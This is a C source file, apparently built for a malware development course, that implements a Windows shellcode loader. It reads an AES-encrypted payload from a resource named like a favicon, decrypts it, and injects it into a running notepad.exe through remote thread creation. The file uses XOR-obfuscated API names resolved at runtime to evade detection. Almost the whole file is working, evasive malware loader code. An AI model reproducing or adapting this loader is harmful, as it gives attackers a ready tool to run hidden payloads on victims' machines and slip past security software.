/*

	Built from skeleton code provided from Sektor7 Malware Development Essentials 

	This project expands upon that code skeleton and implements my own version 
	and code to build the combined project that was alloted at the end of the 
	Sektor7 course

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")



// ================
// HELPER FUNCTIONS
// ================
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen);
int FindTarget(const char *procname);
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len);
char* xor_with_key(const unsigned char* xor_values, size_t xor_length, const char* key) ;



// ======================================
// FUNCTION CALL OBFUSCATION DECLARATIONS
// ======================================
HRSRC (WINAPI * pFindResource)(HMODULE hModule, LPCSTR  lpName,LPCSTR  lpType);
HGLOBAL (WINAPI * pLoadResource)(HMODULE hModule, HRSRC hResInfo);
LPVOID (WINAPI * pLockResource)(HGLOBAL hResData);
DWORD (WINAPI * pSizeofResource)(HMODULE hModule, HRSRC   hResInfo);

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);

HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
BOOL (WINAPI * pCloseHandle)(HANDLE hObject);

LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL (WINAPI * pWriteProcessMemory)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T  *lpNumberOfBytesWritten);
HANDLE (WINAPI * pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);

const char* xor_key = "StdEndl";
unsigned char os_CloseHandle[] = { 0x10, 0x18, 0x0B, 0x36, 0x0B, 0x2C, 0x0D, 0x3D, 0x10, 0x08, 0x20 };
unsigned char os_CreateRemoteThread[] = { 0x10, 0x06, 0x01, 0x24, 0x1A, 0x01, 0x3E, 0x36, 0x19, 0x0B, 0x31, 0x0B, 0x30, 0x04, 0x21, 0x11, 0x05, 0x21 };
unsigned char os_FindResourceA[] = { 0x15, 0x1D, 0x0A, 0x21, 0x3C, 0x01, 0x1F, 0x3C, 0x01, 0x16, 0x26, 0x0B, 0x25 };
unsigned char os_kernel32dll[] = { 0x38, 0x11, 0x16, 0x2B, 0x0B, 0x08, 0x5F, 0x61, 0x5A, 0x00, 0x29, 0x02 };
unsigned char os_LoadResource[] = { 0x1F, 0x1B, 0x05, 0x21, 0x3C, 0x01, 0x1F, 0x3C, 0x01, 0x16, 0x26, 0x0B };
unsigned char os_LockResource[] = { 0x1F, 0x1B, 0x07, 0x2E, 0x3C, 0x01, 0x1F, 0x3C, 0x01, 0x16, 0x26, 0x0B };
unsigned char os_notepadexe[] = { 0x3D, 0x1B, 0x10, 0x20, 0x1E, 0x05, 0x08, 0x7D, 0x11, 0x1C, 0x20 };
unsigned char os_OpenProcess[] = { 0x1C, 0x04, 0x01, 0x2B, 0x3E, 0x16, 0x03, 0x30, 0x11, 0x17, 0x36 };
unsigned char os_RtlMoveMemory[] = { 0x01, 0x00, 0x08, 0x08, 0x01, 0x12, 0x09, 0x1E, 0x11, 0x09, 0x2A, 0x1C, 0x1D };
unsigned char os_SizeofResource[] = { 0x00, 0x1D, 0x1E, 0x20, 0x01, 0x02, 0x3E, 0x36, 0x07, 0x0B, 0x30, 0x1C, 0x07, 0x09 };
unsigned char os_VirtualAlloc[] = { 0x05, 0x1D, 0x16, 0x31, 0x1B, 0x05, 0x00, 0x12, 0x18, 0x08, 0x2A, 0x0D };
unsigned char os_VirtualAllocEx[] = { 0x05, 0x1D, 0x16, 0x31, 0x1B, 0x05, 0x00, 0x12, 0x18, 0x08, 0x2A, 0x0D, 0x21, 0x14 };
unsigned char os_WaitForSingleObject[] = { 0x04, 0x15, 0x0D, 0x31, 0x28, 0x0B, 0x1E, 0x00, 0x1D, 0x0A, 0x22, 0x02, 0x01, 0x23, 0x31, 0x1E, 0x01, 0x26, 0x1A };
unsigned char os_WriteProcessMemory[] = { 0x04, 0x06, 0x0D, 0x31, 0x0B, 0x34, 0x1E, 0x3C, 0x17, 0x01, 0x36, 0x1D, 0x29, 0x09, 0x3E, 0x1B, 0x16, 0x3C };

int main(void) {
	// =====================
	// Variable declarations
	// =====================
	void * payload_memory_buffer; 	    // pointer to the memory buffer that stores the extracted payload
	BOOL virtualprotect_return_value; 	// flag to see if VirtualProtect returned successfully
	HANDLE thread_handle; 				// handle for the newly created thread
	DWORD old_protection = 0; 			// used to store the previous memory protection of the allocated buffer
	HGLOBAL resource_handle = NULL; 	// handle to store return value from LoadResource() Win API
	HRSRC resource; 					// handle to store return value from FindResource() Win API
		
	unsigned char * payload_data; 		// pointer to the actual data of the payload
	unsigned int payload_size; 			// size of the payload data in bytes

	char aes_key[] = { 0x7b, 0x89, 0xca, 0xda, 0x91, 0xf3, 0x64, 0xb6, 0x9d, 0x43, 0x77, 0xbd, 0xca, 0x9f, 0xfd, 0xfe };

	int pid = 0;
    HANDLE hProc = NULL;



	// ==========================================================
	// GET THE PAYLOAD FROM RESOURCE SECTION
	// Find resource, load into memory, lock the loaded resource,
	// return a pointer to its data, then get the payload size
	// ==========================================================
	pFindResource = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_FindResourceA, sizeof(os_FindResourceA), xor_key));
	resource = pFindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	
	pLoadResource = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_LoadResource, sizeof(os_LoadResource), xor_key));
	resource_handle = pLoadResource(NULL, resource);
	
	pLockResource = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_LockResource, sizeof(os_LockResource), xor_key));
	payload_data = (char *) pLockResource(resource_handle);
	
	pSizeofResource = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_SizeofResource, sizeof(os_SizeofResource), xor_key));
	payload_size = pSizeofResource(NULL, resource);


	// ========================================================
	// LOAD THE PAYLOAD INTO THE PROCESS MEMORY 
	// Allocate memory in the current process, copy the payload 
	// into the new memory block, and change the protection 
	// of the memory block to allow it to be executed
	// ========================================================
	pVirtualAlloc = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_VirtualAlloc, sizeof(os_VirtualAlloc), xor_key));
	payload_memory_buffer = pVirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_RtlMoveMemory, sizeof(os_RtlMoveMemory), xor_key));
	pRtlMoveMemory(payload_memory_buffer, payload_data, payload_size);
	
	AESDecrypt((char *) payload_memory_buffer, payload_size, aes_key, sizeof(aes_key));
	
	// BELOW WAS COMMENTED OUT IN FAVOR OF PROCESS INJECTION
	// virtualprotect_return_value = VirtualProtect(payload_memory_buffer, payload_size, PAGE_EXECUTE_READ, &old_protection);
	

	// BELOW WAS COMMENTED OUT IN FAVOR OF PROCESS INJECTION
	// ======================================================================
	// EXECUTE THE PAYLOAD
    // If the buffer protection was changed successfully, create a new thread 
    // that starts executing the code located at the beginning of the 
	// allocated buffer then wait indefinitely for the thread to terminate
	// ======================================================================
	//if ( virtualprotect_return_value != 0 ) 
	//{
	//	thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_memory_buffer, 0, 0, 0);
	//	WaitForSingleObject(thread_handle, -1);
	//}


	// ==================================
	// INJECT PAYLOAD INTO REMOTE PROCESS
	// ==================================
	pid = FindTarget(xor_with_key(os_notepadexe, sizeof(os_notepadexe), xor_key));

	if (pid) 
	{
		//printf("[+] Found target, Notepad.exe PID = %d\n", pid);

		// try to open target process
		pOpenProcess = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_OpenProcess, sizeof(os_OpenProcess), xor_key));
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) 
		{
			Inject(hProc, payload_memory_buffer, payload_size);
			
			pCloseHandle = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_CloseHandle, sizeof(os_CloseHandle), xor_key));
			pCloseHandle(hProc);
		}
	}

	return 0;
}



// ======================================
// AESDecrypt Function from Sektor7 Couse
// ======================================
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		return -1;
	}

	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
	{
		return -1;
	}

	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0))
	{
		return -1;              
	}
	
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey))
	{
		return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len))
	{
		return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


// ==============================
// Find the target remote process
// ==============================
int FindTarget(const char *procname) 
{
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
			
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
			
	pe32.dwSize = sizeof(PROCESSENTRY32); 
			
	if (!Process32First(hProcSnap, &pe32)) 
	{
		pCloseHandle = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_CloseHandle, sizeof(os_CloseHandle), xor_key));
		pCloseHandle(hProcSnap);
		return 0;
	}
			
	while (Process32Next(hProcSnap, &pe32)) 
	{
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) 
		{
			pid = pe32.th32ProcessID;
			break;
		}
	}

	pCloseHandle = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_CloseHandle, sizeof(os_CloseHandle), xor_key));   
	pCloseHandle(hProcSnap);
			
	return pid;
}


// ===================================================
// Helper function to inject payload to remote process
// ===================================================
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) 
{
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	pVirtualAllocEx = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_VirtualAllocEx, sizeof(os_VirtualAllocEx), xor_key));
	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	
	pWriteProcessMemory = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_WriteProcessMemory, sizeof(os_WriteProcessMemory), xor_key));
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
	
	pCreateRemoteThread = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_CreateRemoteThread, sizeof(os_CreateRemoteThread), xor_key));
	hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);

	if (hThread != NULL) 
	{
		pWaitForSingleObject = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)),  xor_with_key(os_WaitForSingleObject, sizeof(os_WaitForSingleObject),  xor_key));
		pWaitForSingleObject(hThread, 500);
			
		pCloseHandle = GetProcAddress(GetModuleHandle(xor_with_key(os_kernel32dll, sizeof(os_kernel32dll), xor_key)), xor_with_key(os_CloseHandle, sizeof(os_CloseHandle), xor_key));
		pCloseHandle(hThread);
		return 0;
	}

	return -1;
}

char* xor_with_key(const unsigned char* xor_values, size_t xor_length, const char* key) 
{
    char* decrypted_string = (char*)malloc(xor_length + 1);
    size_t key_length = strlen(key);

    for (size_t i = 0; i < xor_length; i++) {
        decrypted_string[i] = xor_values[i] ^ key[i % key_length];
    }
	
    decrypted_string[xor_length] = '\0';
    return decrypted_string;
}
